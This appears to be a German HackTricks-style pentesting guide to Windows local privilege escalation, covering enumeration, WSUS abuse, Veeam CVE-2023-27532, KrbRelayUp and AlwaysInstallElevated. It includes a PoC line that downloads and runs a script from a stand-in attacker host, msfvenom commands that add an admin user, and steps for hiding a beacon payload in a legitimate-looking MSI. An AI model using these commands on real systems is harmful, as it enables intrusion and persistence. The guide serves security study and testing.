# Lokale Rechteausweitung unter Windows

{{#include ../../banners/hacktricks-training.md}}

### **Bestes Tool zum Suchen nach Vektoren für lokale Rechteausweitung unter Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Diese Seite fasst die allgemeine Methodik zur Rechteausweitung unter Windows aus mehreren grundlegenden Anleitungen zusammen.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Der praktische Ablauf zur Enumeration stützt sich außerdem auf Community-Workshops und Checklisten.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Das historische Angriffsmaterial umfasst die DerbyCon-Präsentation zur Rechteausweitung unter Windows.<sup>[[5]](#references)</sup>

## Windows-Grundlagen

### Access Tokens

**Wenn du nicht weißt, was Windows Access Tokens sind, lies vor dem Fortfahren die folgende Seite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Weitere Informationen zu ACLs - DACLs/SACLs/ACEs findest du auf der folgenden Seite:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Wenn du nicht weißt, was Integrity Levels unter Windows sind, lies vor dem Fortfahren die folgende Seite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows-Sicherheitskontrollen

Unter Windows gibt es verschiedene Dinge, die **dich daran hindern können, das System zu enumerieren**, ausführbare Dateien auszuführen oder sogar **deine Aktivitäten zu erkennen**. Bevor du mit der Enumeration zur Rechteausweitung beginnst, solltest du die folgende **Seite lesen** und all diese **Abwehrmechanismen enumerieren**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Physischer Zugriff kann außerdem dazu genutzt werden, eine Offline-Bearbeitung des UEFI-NVRAM in eine Pre-Boot-DMA- und Windows-`SYSTEM`-Speicher-Patching-Kette umzuwandeln:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / stille UIAccess-Erhöhung

Über `RAiLaunchAdminProcess` gestartete UIAccess-Prozesse können missbraucht werden, um ohne Aufforderungen High IL zu erreichen, wenn die sicheren Pfadprüfungen von AppInfo umgangen werden. Den speziellen Workflow zur Umgehung von UIAccess/Admin Protection findest du hier:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Die Weitergabe von Accessibility-Registrierungsschlüsseln über die Secure Desktop kann für einen beliebigen SYSTEM-Registrierungsschreibzugriff (RegPwn) missbraucht werden:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Neuere Windows-Builds bieten außerdem einen LPE-Pfad über **SMB an beliebigen Ports**, bei dem eine privilegierte lokale NTLM-Authentifizierung über eine wiederverwendete SMB-TCP-Verbindung reflektiert wird:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Systeminformationen

### Enumeration von Versionsinformationen

Prüfe, ob für die Windows-Version bekannte Schwachstellen existieren (prüfe auch die installierten Patches).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Versions-Exploits

Diese [Website](https://msrc.microsoft.com/update-guide/vulnerability) ist praktisch, um detaillierte Informationen zu Sicherheitslücken in Microsoft-Produkten zu finden. Diese Datenbank enthält mehr als 4.700 Sicherheitslücken und zeigt die **massive Angriffsfläche**, die eine Windows-Umgebung bietet.

**Auf dem System**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — erfasst den OS-Build, installierte Updates und ausgewählte mögliche Advisories; überprüfe das genaue Produkt und ersetzende Updates, bevor du ein Ergebnis als zutreffend behandelst.

Prüfe bei einem versionsspezifischen lokalen Exploit neben der OS-Architektur auch die **Architektur des laufenden Prozesses**. Unter 64-Bit-Windows unterliegt ein 32-Bit-Prozess der [WOW64-Dateisystemumleitung](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` verweist normalerweise auf das 32-Bit-Systemverzeichnis, während `%windir%\Sysnative` dem Prozess Zugriff auf das native Systemverzeichnis ermöglicht. Für einen 64-Bit-Prozess ist dieser Alias nicht verfügbar. Ein OS-Build oder ein mögliches fehlendes KB beweist nicht, dass ein Exploit funktioniert; vergleiche den aktuellen Build, installierte oder ersetzende Updates, die Prozessarchitektur und die Exploit-Voraussetzungen mit dem [Microsoft-Sicherheitsbulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) für das genaue Problem.

**Lokal mit Systeminformationen**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub-Repositories mit Exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Umgebung

Sind Zugangsdaten oder sonstige interessante Informationen in den Umgebungsvariablen gespeichert?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell-Verlauf

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell-Transkriptdateien

Hier erfahren Sie, wie Sie dies aktivieren können: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ist nur ein Beispiel. Die [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) schreibt normalerweise in den Documents-Ordner jedes Benutzers. Eine Einstellung für `OutputDirectory` oder `Start-Transcript -OutputDirectory` kann Dateien jedoch in einen gemeinsamen oder versteckten Ordner umleiten. Prüfe vor dem Überprüfen eines Transcripts den effektiven Ausgabepfad und die Datei-ACL: Es kann Befehlsargumente und Ausgaben enthalten, darunter Zugangsdaten. Ein lesbares Transcript ist nur dann ein Hinweis, wenn sein Inhalt eine verwendbare Identität mit höheren Berechtigungen offenlegt und sich diese Identität im relevanten Kontext anmelden kann.

### PowerShell Module Logging

Details zu PowerShell-Pipelineausführungen werden aufgezeichnet, einschließlich ausgeführter Befehle, Befehlsaufrufe und Teilen von Scripts. Vollständige Ausführungsdetails und Ausgabeergebnisse werden jedoch möglicherweise nicht erfasst.

Aktiviere diese Funktion anhand der Anweisungen im Abschnitt „Transcript files“ der Dokumentation und wähle **„Module Logging“** statt **„Powershell Transcription“**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Um die letzten 15 Ereignisse aus PowersShell-Protokollen anzuzeigen, können Sie Folgendes ausführen:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Dabei werden sämtliche Aktivitäten und der vollständige Inhalt der Skriptausführung erfasst, sodass jeder Codeblock während seiner Ausführung dokumentiert wird. Dieser Prozess bewahrt einen umfassenden Audit-Trail aller Aktivitäten, der für forensische Untersuchungen und die Analyse bösartigen Verhaltens wertvoll ist. Durch die Dokumentation aller Aktivitäten zum Zeitpunkt ihrer Ausführung werden detaillierte Einblicke in den Prozess ermöglicht.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Protokollierungsereignisse für den Script Block finden Sie in der Windows-Ereignisanzeige unter **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Um die letzten 20 Ereignisse anzuzeigen, können Sie Folgendes verwenden:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Interneteinstellungen

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Laufwerke

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Ein HTTP-WSUS-Endpunkt ist ein Ansatzpunkt für die Prüfung auf das Abfangen von Update-Metadaten. Die Ausnutzung hängt außerdem davon ab, ob der Client diesen WSUS-Server verwendet, ob ein Angreifer dessen Datenverkehr abfangen oder kontrollieren kann und welche Vertrauens- und Installationsrichtlinien für Updates auf dem Client gelten. Die URL allein ermöglicht keine Codeausführung. [Microsoft empfiehlt TLS für WSUS-Metadaten](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Prüfe zunächst, ob das Netzwerk ein WSUS-Update ohne SSL verwendet. Führe dazu Folgendes in cmd aus:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Oder Folgendes in PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Wenn du eine Antwort wie eine der folgenden erhältst:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` oder `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gleich `1` ist.

Wenn `UseWUServer` auf `1` gesetzt ist, verwendet Windows Update den konfigurierten Intranetdienst. Das bestätigt eine Voraussetzung für den HTTP-Interception-Pfad, beweist aber nicht, dass Interception, die Annahme schädlicher Updates oder eine Installation mit erhöhten Rechten möglich ist. Wenn der Wert auf `0` gesetzt ist, wird dieser bestimmte konfigurierte WSUS-Endpunkt von dieser Richtlinie nicht ausgewählt.

Um diese Schwachstellen auszunutzen, kannst du Tools wie [Wsuxploit](https://github.com/pimps/wsuxploit) und [pyWSUS ](https://github.com/GoSecure/pywsus) verwenden. Dabei handelt es sich um als MiTM-Waffen ausgestattete Exploit-Skripte, die gefälschte Updates in nicht per SSL gesicherten WSUS-Datenverkehr einschleusen.

Lies die Recherche hier:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lies den vollständigen Bericht hier**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Im Grunde wird bei diesem Bug folgende Schwachstelle ausgenutzt:

> Wenn wir unseren lokalen Benutzer-Proxy ändern können und Windows Updates den in den Internet-Explorer-Einstellungen konfigurierten Proxy verwenden, können wir PyWSUS lokal ausführen, um unseren eigenen Datenverkehr abzufangen und Code als Benutzer mit erhöhten Rechten auf unserem System auszuführen.
>
> Da der WSUS-Dienst außerdem die Einstellungen des aktuellen Benutzers verwendet, nutzt er auch dessen Zertifikatspeicher. Wenn wir ein selbstsigniertes Zertifikat für den WSUS-Hostnamen erzeugen und es dem Zertifikatspeicher des aktuellen Benutzers hinzufügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Datenverkehr abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine Validierung nach dem Trust-on-first-use-Prinzip für das Zertifikat umzusetzen. Wenn das vorgelegte Zertifikat vom Benutzer als vertrauenswürdig eingestuft wird und den korrekten Hostnamen aufweist, wird es vom Dienst akzeptiert.

Du kannst diese Schwachstelle mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausnutzen (sobald es veröffentlicht ist).

### Durch WSUS-Administratoren kontrollierte Updates

Ein separater Pfad besteht, wenn die aktuelle Identität Updates auf einem WSUS-Server **veröffentlichen und genehmigen** kann. Prüfe die effektive Mitgliedschaft in der Gruppe `WSUS Administrators` des Servers sowie delegierte WSUS-Berechtigungen. Ermittle anschließend die Clientcomputergruppe, die ein genehmigtes Update erhalten würde. [Microsoft verlangt WSUS-Administratorrechte zum Genehmigen von Updates](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) und [dokumentiert die Vertrauensbeziehung beim Veröffentlichen](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): Clients müssen dem Signaturzertifikat vertrauen, das für lokal veröffentlichte Inhalte verwendet wird. Stelle sicher, dass das betreffende Update signiert und akzeptiert wird, für das Ziel gilt und in einem Kontext mit höheren Rechten installiert wird, bevor du dies als Privilege-Escalation-Pfad betrachtest. Ein HTTP-`WUServer`-Wert oder ein Gruppenname allein belegt diese Voraussetzungen nicht.

### Missbrauch benutzerdefinierter Updates über SUSDB: nicht signierte Payloads via `.txt`/`.esd`

Dies ist ein anderer Fehler an der Vertrauensgrenze als das Abfangen einer HTTP-WSUS-Verbindung: Voraussetzung ist ausreichender Zugriff auf die **gespeicherten Prozeduren der WSUS-Datenbank (`SUSDB`)**, um ein benutzerdefiniertes Update zu veröffentlichen und zu genehmigen. Ein möglicher Einstieg ist, ein Upstream-WSUS-Computerkonto an einen separaten MSSQL-Server weiterzuleiten, auf dem `SUSDB` gehostet wird. Die genauen Voraussetzungen hängen von der Bereitstellung ab. Ermittle daher zuerst die `EXECUTE`-Berechtigungen, statt SQL-Administratorrechte vorauszusetzen.<sup>[[38]](#references)[[39]](#references)</sup>

Informationen zum separaten Angriffspfad, bei dem die Authentifizierung von WSUS-Clients von HTTP/8530 an LDAP, SMB oder AD CS weitergeleitet wird, findest du unter [Missbrauch von WSUS HTTP für NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Update erstellen, Ziel festlegen und genehmigen

Der Workflow für benutzerdefinierte Updates verwendet legitime WSUS-Prozeduren als eingeschränkte Veröffentlichungs-API. Die wichtigen Zustandsübergänge sind:<sup>[[38]](#references)</sup>

| Phase | Relevante gespeicherte Prozeduren |
| --- | --- |
| Update-Metadaten importieren | `spImportUpdate` |
| Voraussetzungen sowie lokalisierte und erweiterte XML-Fragmente speichern | `spSaveXMLFragment` |
| Den Inhaltsdigest der vom Angreifer kontrollierten URL zuordnen | `spSetBatchURL` |
| Eine Computergruppe auflisten/erstellen und den Client hinzufügen | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Installation für diese Gruppe genehmigen | `spDeployUpdate` mit `@actionID = 0` und `@isAssigned = 1` |

Dateiname, Digests, Größe und `CommandLineInstallation`-Handler müssen in den importierten Metadaten und Fragmenten übereinstimmen. Nachdem die Inhalts-URL und die Zielgruppe festgelegt wurden, sieht die abschließende Genehmigung etwa wie folgt aus. Verwende neue Update-, Gruppen- und Deployment-IDs, statt Beispiel-GUIDs wiederzuverwenden.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Erweiterungsbasierter Signatur-Bypass

WSUS weist normalerweise beliebige, nicht signierte ausführbare Inhalte zurück. In `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` setzt der .NET-Pfad `VerifyFile` jedoch das Flag für die Zertifikatsprüfung auf false, wenn der angegebene Dateiname auf `.txt` oder `.esd` endet; `CheckCertificateSignature` wird dann übersprungen, ohne vorher nachzuweisen, dass es sich bei den Bytes um Text oder ein legitimes ESD-Abbild handelt. Daher kann eine unveränderte PE-Datei mit einem Namen wie `payload.exe.txt` die Inhaltsprüfung bestehen und später vom Befehlszeilen-Installationshandler des Updates gestartet werden. Dabei handelt es sich um einen Policy-/Typverwechslungsfehler, nicht um eine Signaturfälschung.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-kompatibles Staging und Automatisierung

Der Aufruf von `spDeployUpdate` veranlasst WSUS, den registrierten Inhalt abzurufen. Der Ursprung muss die HTTP-Anforderungen von BITS erfüllen: Eine erreichbare URL allein reicht nicht aus, da die Übertragung einen anfänglichen `HEAD`-/`GET`-Ablauf und Byte-Range-Anfragen verwendet. Ein Server ohne Range-Unterstützung erzeugt das WSUS-Synchronisierungsereignis `EventId=364` mit dem Hinweis, dass BITS den Range-Protokollheader benötigt.<sup>[[39]](#references)</sup>

Der Research-PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiert das für die Import-/Fragment-/URL-/Gruppen-/Deployment-Kette erforderliche SQL, enthält einen modifizierten MSSQL-Client zur Ausführung und liefert `BitsWebServer.py` für das Content-Staging mit. Ein minimaler Aufruf in einem autorisierten Lab lautet:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Unbeaufsichtigte Ausführung und Wiederholungs-Persistenz

Die clientseitige Interaktion hängt von der Richtlinie ab. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, Option `4 - Auto download and schedule install`, bewirkt, dass ein genehmigtes Update heruntergeladen und nach dem konfigurierten Zeitplan installiert wird, ohne dass der Benutzer es manuell auswählen muss. Bei Tests wurde ein Payload, dessen Update weiterhin fehlgeschlagen/unvollständig war, sofort nach Beenden des Callback-Prozesses erneut angeboten. Dadurch kann das Wiederholungsverhalten zu wiederkehrender Ausführungs-Persistenz werden; es ist auffällig, da der Client einen fehlgeschlagenen Update-Status anzeigt.<sup>[[39]](#references)</sup>

#### Erkennung und Hardening-Ansatzpunkte

Nützliche server- und clientseitige Ansatzpunkte aus dieser Angriffskette sind:<sup>[[39]](#references)</sup>

- Die Ausführung von `spCreateTargetGroup`, `spSetBatchURL` und `spDeployUpdate` in `SUSDB` überwachen; neue Zielgruppen, externe Content-Quellen, Update-Payloads mit `.txt`/`.esd` sowie Deployments durch unerwartete Principals untersuchen (insbesondere Nicht-Computerkonten).
- `C:\Program Files\Update Services\LogFiles` auf `ContentSyncAgent`, `FileVerified`, den falsch geschriebenen Eintrag `FileVerficationFailed` und `EventId=364` prüfen; die Verifizierung mit der Payload-Erweiterung und dem Content-Magic-Wert abgleichen, statt der Dateiendung zu vertrauen.
- Wiederholte Fehler/Wiederholungsversuche bei der Windows-Update-Installation sowie PE-Ausführung oder unerwartete Child-Prozesse/Netzwerkaktivitäten bei Content mit `.txt`- oder `.esd`-Dateinamen suchen.
- Sofern unterstützt, Extended Protection for Authentication für den Datenbankdienst voraussetzen und den Netzwerkzugriff auf die Datenbank auf den WSUS-Server und autorisierte Administrationssysteme beschränken. `EXECUTE`-Rechte für die benutzerdefinierten Update-Prozeduren minimieren und überwachen.

## Drittanbieter-Auto-Updater und Agent-IPC (local privesc)

Viele Enterprise-Agents stellen eine localhost-IPC-Schnittstelle und einen privilegierten Update-Kanal bereit. Wenn die Registrierung an einen Angreifer-Server umgeleitet werden kann und der Updater einer rogue Root-CA oder schwachen Signaturprüfungen vertraut, kann ein lokaler Benutzer ein bösartiges MSI bereitstellen, das der SYSTEM-Dienst installiert. Eine verallgemeinerte Technik (basierend auf der Netskope-stAgentSvc-Angriffskette – CVE-2025-0309) finden Sie hier:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM über TCP 9401)

Veeam Backup & Replication und Cloud Connect verwenden standardmäßig einen zentralen Backup-Dienst über **TCP/9401**. [Veeams Sicherheitshinweis](https://www.veeam.com/kb4424) beschreibt die unauthentifizierte Offenlegung verschlüsselter Anmeldedaten der Konfigurationsdatenbank innerhalb des Backup-Netzwerkperimeters; ein separates öffentliches PoC demonstriert einen Pfad zur Befehlsausführung als **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Der Dienst kann an mehr als nur localhost gebunden sein. Prüfen Sie daher die tatsächliche Adresse und die PID.

- **Recon**: Bestätigen, dass TCP/9401 zu `Veeam.Backup.Service.exe` gehört, und anschließend das installierte Produkt sowie Patch-Metadaten prüfen. `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` sind Hinweise, aber keine vollständige Patch-Prüfung.
- **Behobene Mindestversionen**: Veeam nennt **11a build 11.0.1.1261 P20230227** und **12 build 12.0.0.1420 P20230223** als erste behobene Releases; frühere Releases sind betroffen. Eine vierteilige Dateiversion allein kann einen ungepatchten Basis-Build nicht von einem späteren Patch desselben Builds unterscheiden. Prüfen Sie die Patch-Kennung anhand der [Build-Historie des Herstellers](https://www.veeam.com/kb2680), bevor Sie einen Grenz-Build als behoben einstufen.
- **Exploit**: Eine PoC-Datei wie `VeeamHax.exe` zusammen mit den benötigten Veeam-DLLs im selben Verzeichnis ablegen und anschließend über den lokalen Socket einen SYSTEM-Payload auslösen:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Der zitierte PoC zeigt die Ausführung von Befehlen als SYSTEM, sofern die zusätzlichen Voraussetzungen erfüllt sind; der Hinweis des Herstellers beschreibt das Problem der Offenlegung von Anmeldedaten.
## KrbRelayUp

Ein lokales Kerberos-Relay kann von einer Anmeldung mit geringeren Berechtigungen zu einem privilegierten Verzeichnisschreibzugriff führen, wenn sich ein geeigneter COM-Server authentifiziert und der weitergeleitete Principal Schreibrechte auf dem Zielobjekt hat. [KrbRelay dokumentiert](https://github.com/cube0x0/KrbRelay) LDAP-Schreibvorgänge für RBCD und `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatisiert einige dieser Pfade. Eine RBCD-Kette setzt passende Delegierung und Rechte auf dem Zielobjekt voraus, während eine shadow-credential-Kette Schreibrechte für Schlüsselanmeldedaten und einen KDC erfordert, der den Zertifikatsauthentifizierungspfad unterstützt. Keiner der beiden Pfade ergibt sich allein aus der Mitgliedschaft in einer Domäne.

Prüfen Sie die Richtlinien des tatsächlichen DC für [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) und [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), die Objekt-ACL der weitergeleiteten Identität sowie die Authentifizierungs- und Identitätswechselebenen der ausgewählten COM-Klasse. Anmeldetyp und Anmeldeinformationskontext des Aufrufers sind relevant: Eine WinRM-Sitzung kann sich anders verhalten als eine interaktive Anmeldung oder eine Anmeldung mit neuen Anmeldeinformationen. Auch Firewall-/OXID-Routing und installierte Updates können das Ergebnis beeinflussen. Betrachten Sie eine permissive Richtlinie oder eine passende ACL als Prüfhinweis; passive Enumeration sollte keine COM-Coercion, Relay-Authentifizierung oder Verzeichnisschreibvorgänge auslösen. Eine shadow credential für ein Computerkonto kann zu einem Computerticket führen und nur dann, wenn dieses Konto die erforderlichen Verzeichnisreplikationsrechte besitzt, zu einem separaten DCSync-Pfad.

Finden Sie den **Exploit unter** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Weitere Informationen zum Ablauf des Angriffs finden Sie unter [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Wenn** diese 2 Registrierungsschlüssel **aktiviert** sind (Wert **0x1**), können Benutzer jeder Berechtigungsstufe `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit-Payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Wenn du über eine Meterpreter-Sitzung verfügst, kannst du diese Technik mit dem Modul **`exploit/windows/local/always_install_elevated`** automatisieren.

### PowerUP

Verwende den Befehl `Write-UserAddMSI` aus PowerUP, um im aktuellen Verzeichnis eine Windows-MSI-Binärdatei zur Rechteausweitung zu erstellen. Dieses Skript schreibt einen vorkompilierten MSI-Installer, der zum Hinzufügen eines Benutzers/einer Gruppe auffordert (du benötigst also GIU-Zugriff):

```
Write-UserAddMSI
```

Führen Sie einfach die erstellte Binärdatei aus, um Ihre Berechtigungen zu erweitern.

### MSI Wrapper

Lesen Sie dieses Tutorial, um zu erfahren, wie Sie mit diesen Tools einen MSI Wrapper erstellen. Beachten Sie, dass Sie eine „**.bat**“-Datei einbinden können, wenn Sie **nur** **Befehlszeilen ausführen** möchten.


{{#ref}}
msi-wrapper.md
{{#endref}}

### MSI mit WIX erstellen


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### MSI mit Visual Studio erstellen

- **Erzeugen** Sie mit Cobalt Strike oder Metasploit ein **neues Windows-EXE-TCP-Payload** unter `C:\privesc\beacon.exe`.
- Öffnen Sie **Visual Studio**, wählen Sie **Create a new project** und geben Sie „installer“ in das Suchfeld ein. Wählen Sie das Projekt **Setup Wizard** aus und klicken Sie auf **Next**.
- Geben Sie dem Projekt einen Namen, z. B. **AlwaysPrivesc**, verwenden Sie `C:\privesc` als Speicherort, wählen Sie **place solution and project in the same directory** aus und klicken Sie auf **Create**.
- Klicken Sie so lange auf **Next**, bis Sie zu Schritt 3 von 4 gelangen (Dateien auswählen, die einbezogen werden sollen). Klicken Sie auf **Add** und wählen Sie das gerade erstellte Beacon-Payload aus. Klicken Sie anschließend auf **Finish**.
- Markieren Sie das Projekt **AlwaysPrivesc** im **Solution Explorer** und ändern Sie unter **Properties** den Wert von **TargetPlatform** von **x86** zu **x64**.
  - Sie können weitere Eigenschaften ändern, etwa **Author** und **Manufacturer**, damit die installierte Anwendung legitimer wirkt.
- Klicken Sie mit der rechten Maustaste auf das Projekt und wählen Sie **View > Custom Actions**.
- Klicken Sie mit der rechten Maustaste auf **Install** und wählen Sie **Add Custom Action**.
- Doppelklicken Sie auf **Application Folder**, wählen Sie Ihre Datei **beacon.exe** aus und klicken Sie auf **OK**. Dadurch wird sichergestellt, dass das Beacon-Payload ausgeführt wird, sobald das Installationsprogramm gestartet wird.
- Ändern Sie unter **Custom Action Properties** den Wert von **Run64Bit** zu **True**.
- **Erstellen** Sie es abschließend.
